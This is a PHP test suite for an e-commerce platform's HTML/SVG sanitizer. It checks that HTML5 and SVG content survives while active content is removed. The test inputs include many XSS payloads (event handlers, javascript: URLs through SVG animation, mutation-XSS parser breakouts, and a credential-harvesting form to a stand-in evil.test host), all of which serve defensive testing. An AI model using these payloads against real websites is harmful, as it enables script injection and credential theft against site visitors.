<?php

/**
 * SPDX-FileCopyrightText: 2026 Maho <https://mahocommerce.com>
 * SPDX-License-Identifier: OSL-3.0
 */

declare(strict_types=1);

uses(Tests\MahoBackendTestCase::class);

class PurifierTestPaintFilter extends Mage_Core_Model_Input_Filter_SvgPaint {}

class PurifierTestNotAFilter {}

beforeEach(function () {
    $this->purifier = Mage::helper('core/purifier');
});

describe('Mage_Core_Helper_Purifier HTML5 support', function () {
    // Regression: the previous HTMLPurifier-based implementation validated against
    // XHTML 1.0 Transitional, which predates HTML5. Every element below was unknown
    // to it and got unwrapped on save, silently destroying stored content.
    it('keeps HTML5 media elements', function (string $input) {
        expect($this->purifier->purify($input))->toContain($input === '' ? '' : '<');
    })->with([
        '<video controls><source src="/a.mp4" /></video>',
        '<audio controls src="/a.mp3"></audio>',
        '<picture><source srcset="/a.webp" /><img src="/a.jpg" alt="x" /></picture>',
    ]);

    it('keeps HTML5 semantic elements', function (string $tag) {
        expect($this->purifier->purify("<$tag>content</$tag>"))->toContain("<$tag>");
    })->with(['figure', 'figcaption', 'details', 'summary', 'section', 'article', 'mark']);

    it('keeps attributes the old doctype dropped', function () {
        $html = '<a href="/x" target="_blank" rel="noopener">l</a>';
        expect($this->purifier->purify($html))
            ->toContain('target="_blank"')
            ->toContain('rel="noopener"');

        expect($this->purifier->purify('<img src="/a.jpg" alt="x" loading="lazy" />'))
            ->toContain('loading="lazy"');
    });

    it('keeps class, which themes depend on', function () {
        expect($this->purifier->purify('<p class="std">x</p>'))->toContain('class="std"');
    });

    it('keeps arbitrary data-* attributes', function () {
        // The sanitizer matches allowed attributes by exact name and has no wildcard:
        // allowAttribute('data-attr', '*') allows an attribute literally called
        // "data-attr", not every data attribute. The names are read off the content.
        expect($this->purifier->purify('<div data-role="slider" data-autoplay="1">x</div>'))
            ->toContain('data-role="slider"')
            ->toContain('data-autoplay="1"');

        expect($this->purifier->purify('<div data-foo="1"><span data-bar="2">y</span></div>'))
            ->toContain('data-foo="1"')
            ->toContain('data-bar="2"');
    });

    it('keeps the aria attributes the theme components read', function () {
        // DaisyUI's rating fills its stars up to the one marked aria-current, so a star
        // block authored in CMS content renders empty when the attribute is dropped
        $html = '<div class="rating" aria-label="Rated 5 out of 5"><div class="mask" aria-current="true"></div><span aria-hidden="true">*</span></div>';
        expect($this->purifier->purify($html))
            ->toContain('aria-label="Rated 5 out of 5"')
            ->toContain('aria-current="true"')
            ->toContain('aria-hidden="true"');
    });

    it('does not let a data-* allowance smuggle in an event handler', function () {
        expect($this->purifier->purify('<div data-role="x" onclick="alert(1)">z</div>'))
            ->toContain('data-role="x"')
            ->not->toContain('onclick');
    });
});

describe('Mage_Core_Helper_Purifier removes active content', function () {
    it('drops dangerous elements with their contents', function (string $input) {
        expect(trim((string) $this->purifier->purify($input)))->toBe('');
    })->with([
        '<script>alert(1)</script>',
        '<iframe src="https://evil.test"></iframe>',
        '<object data="x.swf"></object>',
        '<embed src="x.swf" />',
        '<base href="https://evil.test/" />',
    ]);

    it('drops event handler attributes', function () {
        expect($this->purifier->purify('<img src="/x.jpg" onerror="alert(1)" />'))
            ->not->toContain('onerror');
    });

    it('rejects non-transport schemes in media sources', function () {
        expect($this->purifier->purify('<img src="data:image/svg+xml;base64,PHN2Zz48L3N2Zz4=" />'))
            ->not->toContain('data:');
    });

    it('accepts arrays, purifying each entry', function () {
        expect($this->purifier->purify(['<b>a</b>', '<script>b</script>']))
            ->toBe(['<b>a</b>', '']);
    });

    it('does not truncate content that fits the storage column', function () {
        // The Symfony sanitizer silently truncates at 20000 characters by default,
        // which would cut the tail off a normal CMS page on save. The cap is raised
        // to the MEDIUMTEXT bound of the content column instead.
        $long = '<p>' . str_repeat('a', 50000) . '</p>';
        expect(strlen((string) $this->purifier->purify($long)))->toBeGreaterThan(49_000);

        expect(Mage_Core_Helper_Purifier::MAX_INPUT_LENGTH)->toBe(2_097_152);
    });
});

describe('Mage_Core_Helper_Purifier inline style', function () {
    // The WYSIWYG stores alignment as inline style and preserves class on every node,
    // so both survive even though the W3C baseline excludes them.
    it('keeps presentational declarations the editor emits', function () {
        expect($this->purifier->purify('<p style="text-align:center;color:#ff0000">x</p>'))
            ->toContain('text-align:center')
            ->toContain('color:#ff0000');
    });

    it('leaves the CSS-level vectors to the malicious-code regex pass', function () {
        // filter() strips expression()/behavior:/javascript: from the raw markup before
        // this helper ever sees it; the sanitizer itself does not parse CSS.
        $filter = new Mage_Core_Model_Input_Filter_MaliciousCode();
        expect($filter->filter('<div style="width:expression(alert(1))">x</div>'))
            ->not->toContain('expression')
            ->and($filter->filter('<div style="behavior:url(x.htc)">x</div>'))->not->toContain('behavior');
    });
});

describe('Mage_Core_Helper_Purifier form handling', function () {
    // Forms are dropped as the W3C baseline has them. A form in a content field posts
    // wherever its action says, under the merchant's own domain and certificate, which
    // is what makes a credential prompt convincing. Use a block or widget instead.
    it('drops form controls', function (string $input) {
        expect($this->purifier->purify($input))->not->toContain('<');
    })->with([
        '<form action="https://evil.test/harvest"><input name="password" /></form>',
        '<input name="q" />',
        '<select><option>a</option></select>',
        '<textarea></textarea>',
    ]);

    it('leaves ordinary external links alone', function () {
        expect($this->purifier->purify('<a href="https://external.example/p">l</a>'))
            ->toContain('https://external.example/p');
    });
});

describe('Mage_Core_Helper_Purifier inline SVG', function () {
    // An author pastes an icon, a logo or a diagram into a content field. Before this change the
    // W3C baseline held no SVG element, so every save removed the whole graphic.
    it('keeps a plain icon', function () {
        $icon = '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" '
            . 'stroke="currentColor" stroke-width="2"><path d="M12 2l3 7h7l-6 4"></path></svg>';

        expect($this->purifier->purify($icon))
            ->toContain('<svg')
            ->toContain('d="M12 2l3 7h7l-6 4"')
            ->toContain('stroke="currentColor"');
    });

    // Symfony writes lower case names. The HTML5 rules for SVG give the browser the standard
    // spelling again, so the graphic still draws. Do not "correct" the stored markup.
    it('stores element and attribute names in lower case', function () {
        expect($this->purifier->purify('<svg viewBox="0 0 1 1"><linearGradient id="a"></linearGradient></svg>'))
            ->toContain('viewbox="0 0 1 1"')
            ->toContain('<lineargradient');
    });

    it('keeps a gradient, a clip path and the local references that join them', function () {
        $logo = '<svg viewBox="0 0 100 100"><defs>'
            . '<linearGradient id="a"><stop offset="0" stop-color="#ff0055"></stop></linearGradient>'
            . '<clipPath id="c"><rect width="50" height="50" rx="8"></rect></clipPath>'
            . '</defs><g clip-path="url(#c)"><rect width="100" height="100" fill="url(#a)"></rect></g></svg>';

        expect($this->purifier->purify($logo))
            ->toContain('fill="url(#a)"')
            ->toContain('clip-path="url(#c)"')
            ->toContain('stop-color="#ff0055"');
    });

    it('keeps text inside a graphic', function () {
        expect($this->purifier->purify('<svg viewBox="0 0 100 20"><text x="0" y="15" font-size="14">MAHO</text></svg>'))
            ->toContain('<text x="0" y="15" font-size="14">MAHO</text>');
    });

    it('drops a description inline, because the editor cannot mirror what a save keeps there', function () {
        expect($this->purifier->purify('<svg viewBox="0 0 1 1"><desc>A <strong>bold</strong> label</desc><path d="M0 0"></path></svg>'))
            ->not->toContain('<desc')
            ->not->toContain('<strong')
            ->toContain('d="M0 0"')
            ->and(\Maho\Security\SvgAllowlist::forEditor())->not->toHaveKey('desc')
            ->and(\Maho\Security\SvgAllowlist::elementNames())->toContain('desc');
    });

    it('keeps the class and the accessible name of a graphic', function () {
        // These come from EXTRA_ATTRIBUTES, which buildConfig() must apply after it allows the SVG
        // elements. In the other order the wildcard misses them.
        expect($this->purifier->purify('<svg viewBox="0 0 1 1" class="w-6" aria-label="Rating"><path d="M0 0"></path></svg>'))
            ->toContain('class="w-6"')
            ->toContain('aria-label="Rating"');
    });

    it('keeps the fill mode of an animation but not a paint value', function () {
        expect($this->purifier->purify('<svg><animate attributeName="opacity" from="0" to="1" dur="1s" fill="freeze"></animate></svg>'))
            ->toContain('fill="freeze"');

        expect($this->purifier->purify('<svg><animate attributeName="opacity" dur="1s" fill="url(https://evil.test/x)"></animate></svg>'))
            ->not->toContain('evil.test');
    });

    // buildConfig() must declare only the names the baseline lacks. allowElement() replaces what
    // the baseline grants a name, so declaring `a` would strip every link on the page instead.
    it('leaves the baseline attributes of an ordinary link alone', function () {
        expect($this->purifier->purify('<a href="/p" name="n" title="t" target="_blank" rel="noopener">l</a>'))
            ->toContain('name="n"')
            ->toContain('title="t"');
    });

    // A save keeps a link inside a graphic, so the editor allowlist must name it too. An author
    // who writes a name that only one side knows gets a warning about a loss that does not happen.
    it('gives the editor every link attribute that a save keeps', function () {
        $markup = '<svg viewBox="0 0 1 1"><a href="/sale" id="cta" role="link" lang="en" '
            . 'target="_blank" rel="noopener" class="c">text</a></svg>';
        $saved = (string) $this->purifier->purify($markup);
        $editor = \Maho\Security\SvgAllowlist::forEditor()['a']['attributes'];

        foreach (['href', 'id', 'role', 'lang', 'target', 'rel', 'class'] as $attribute) {
            expect($saved)->toContain($attribute . '=')
                ->and($editor)->toHaveKey($attribute);
        }
    });

    it('keeps an animation that only moves the graphic', function () {
        $spinner = '<svg viewBox="0 0 24 24"><circle cx="4" cy="12" r="3"></circle>'
            . '<animateTransform attributeName="transform" type="rotate" dur="1s" '
            . 'values="0 12 12;360 12 12" repeatCount="indefinite"></animateTransform></svg>';

        expect($this->purifier->purify($spinner))
            ->toContain('attributename="transform"')
            ->toContain('values="0 12 12;360 12 12"');
    });

    it('cannot keep a title, because Symfony reserves that name for the document head', function () {
        // HtmlSanitizer keeps only the configured elements that its internal HEAD_ELEMENTS list
        // does not contain, so allowElement('title') has no effect. aria-label replaces it.
        expect($this->purifier->purify('<svg viewBox="0 0 1 1"><title>Logo</title><path d="M0 0"></path></svg>'))
            ->not->toContain('<title>')
            ->toContain('<path');
    });

    it('removes an element that runs code or reads another document', function (string $input) {
        expect($this->purifier->purify($input))
            ->not->toContain('alert(1)')
            ->and($this->purifier->purify($input))->not->toMatch('/<(script|style|foreignobject|use|image|mpath)\b/i');
    })->with([
        '<svg><script>alert(1)</script><path d="M0 0"></path></svg>',
        '<svg><style>@import"//evil.test"</style></svg>',
        '<svg><foreignObject><img src=x onerror=alert(1)></foreignObject></svg>',
        '<svg><use href="data:image/svg+xml;base64,PHN2Zz4="></use></svg>',
        '<svg><use xlink:href="https://evil.test/x.svg#a"></use></svg>',
        '<svg><image href="https://evil.test/x.svg"></image></svg>',
        '<svg><path d="M0 0"><animateMotion><mpath href="https://evil.test/p.svg#p"></mpath></animateMotion></path></svg>',
    ]);

    it('removes an event handler from a graphic', function (string $input) {
        expect($this->purifier->purify($input))->not->toMatch('/\bon[a-z]+\s*=/i');
    })->with([
        '<svg onload="alert(1)"><path d="M0 0"></path></svg>',
        '<svg><path d="M0 0" onclick="alert(1)"></path></svg>',
        '<svg><path d="M0 0" onbegin="alert(1)"></path></svg>',
    ]);

    // A paint attribute holds a URL, so an allowed name on an allowed element can still make the
    // storefront read a document from another server.
    it('keeps a paint value only when it points inside the same document', function (string $input) {
        expect($this->purifier->purify($input))->not->toContain('evil.test');
    })->with([
        '<svg><path d="M0 0" fill="url(https://evil.test/x#y)"></path></svg>',
        '<svg><g clip-path="url(//evil.test/x#c)"><path d="M0 0"></path></g></svg>',
        '<svg><linearGradient id="a" href="https://evil.test/g.svg#g"></linearGradient></svg>',
    ]);

    // An animation changes an attribute after the browser reads the page, so markup that looks
    // safe can still become a live link or a remote request.
    it('removes an animation that targets an attribute the author may not write', function (string $input) {
        expect($this->purifier->purify($input))->not->toMatch('/attributename=/i');
    })->with([
        '<svg><a href="#"><animate attributeName="href" values="javascript:alert(1)"></animate></a></svg>',
        '<svg><a><animate attributeName="xlink:href" to="javascript:alert(1)"></animate></a></svg>',
        '<svg><set attributeName="onload" to="alert(1)"></set></svg>',
        '<svg><path d="M0 0"><set attributeName="onclick" to="alert(1)"></set></path></svg>',
        '<svg><path d="M0 0"><animate attributeName="class" to="evil"></animate></path></svg>',
        '<svg><path d="M0 0"><animate attributeName="style" to="x"></animate></path></svg>',
        '<svg><path d="M0 0"><animate attributeName="id" to="other"></animate></path></svg>',
    ]);

    it('removes an animation value that points at another document', function (string $input) {
        expect($this->purifier->purify($input))->not->toContain('evil.test');
    })->with([
        '<svg><path d="M0 0"><animate attributeName="fill" to="url(https://evil.test/x)" dur="1s"></animate></path></svg>',
        '<svg><path d="M0 0"><animate attributeName="fill" values="url(//evil.test/x);red" dur="1s"></animate></path></svg>',
    ]);

    // The sanitizer and the browser must agree on how they read the stored markup. When a second
    // pass changes nothing, the two parse the same tree, and a mutation XSS cannot arise.
    it('reaches a fixed point, so a second pass changes nothing', function (string $input) {
        $once = (string) $this->purifier->purify($input);

        expect((string) $this->purifier->purify($once))->toBe($once);
    })->with([
        '<svg></p><style><a id="</style><img src=1 onerror=alert(1)>">',
        '<svg><title><img src=1 onerror=alert(1)></title><path d="M0 0"></path></svg>',
        '<svg><desc><![CDATA[</desc><img src=1 onerror=alert(1)>]]></desc></svg>',
        '<svg><noscript><p title="</noscript><img src=1 onerror=alert(1)>">',
        '<svg><textarea><path d="</textarea><img src=1 onerror=alert(1)>"></textarea></svg>',
        '<svg><svg><foreignObject><svg><img src=1 onerror=alert(1)></svg></foreignObject></svg></svg>',
        '<svg><![CDATA[</svg><img src=1 onerror=alert(1)>]]></svg>',
        '<svg viewBox="0 0 24 24"><text><tspan>a</tspan></text></svg>',
    ]);

    // The baseline holds no child of an SVG <font>, so the element draws nothing inside a graphic
    // and needs no rule. A rule would reach the legacy HTML element as well and strip it.
    it('keeps a legacy font element whole', function () {
        expect($this->purifier->purify('<p><font color="red" face="Arial">legacy</font></p>'))
            ->toBe('<p><font face="Arial">legacy</font></p>');
    });

    it('empties an svg font, because the baseline holds no child of one', function () {
        expect($this->purifier->purify(
            '<svg><font horiz-adv-x="1"><font-face><font-face-src>'
            . '<font-face-uri xlink:href="https://evil.test/f.svg"></font-face-uri>'
            . '</font-face-src></font-face></font></svg>',
        ))->not->toContain('evil.test');
    });

    // A browser that cannot resolve the reference paints the color that follows it. The value is
    // local, so the whole attribute must survive.
    it('keeps a paint value that names a local reference and a fallback color', function () {
        expect($this->purifier->purify('<svg><path d="M0 0" fill="url(#a) red"></path></svg>'))
            ->toContain('fill="url(#a) red"');
    });

    // `style` reaches the same paint property, and this filter does not read it. Purifier allows
    // `style` on every element, so a plain <div> already reads a document from another server, and
    // inline SVG does not change that.
    it('leaves a style declaration alone', function () {
        expect($this->purifier->purify('<div style="background-image:url(https://cdn.example/a.png)">x</div>'))
            ->toContain('background-image:url(https://cdn.example/a.png)');
    });

    it('builds every value filter through the model factory', function (string $class, ?string $throws) {
        $cache = new ReflectionProperty(Mage_Core_Model_Config::class, '_classNameCache');
        $cache->setValue(Mage::getConfig(), []);
        Mage::getConfig()->setNode('global/models/core/rewrite/input_filter_svgPaint', $class);

        try {
            $build = Mage_Core_Helper_Purifier::attributeSanitizers(...);
            if ($throws !== null) {
                expect($build)->toThrow($throws);
            } else {
                expect($build()[0])->toBeInstanceOf($class);
            }
        } finally {
            Mage::getConfig()->setNode('global/models/core/rewrite/input_filter_svgPaint', '');
            $cache->setValue(Mage::getConfig(), []);
        }
    })->with([
        [PurifierTestPaintFilter::class, null],
        [PurifierTestNotAFilter::class, Mage_Core_Exception::class],
    ]);

    it('never runs code from a graphic that tries to change how the browser reads it', function (string $input) {
        expect($this->purifier->purify($input))->not->toMatch('/\bonerror\s*=|<script/i');
    })->with([
        '<svg></p><style><a id="</style><img src=1 onerror=alert(1)>">',
        '<svg><title><img src=1 onerror=alert(1)></title><path d="M0 0"></path></svg>',
        '<svg><noscript><p title="</noscript><img src=1 onerror=alert(1)>">',
        '<svg><textarea><path d="</textarea><img src=1 onerror=alert(1)>"></textarea></svg>',
    ]);
});
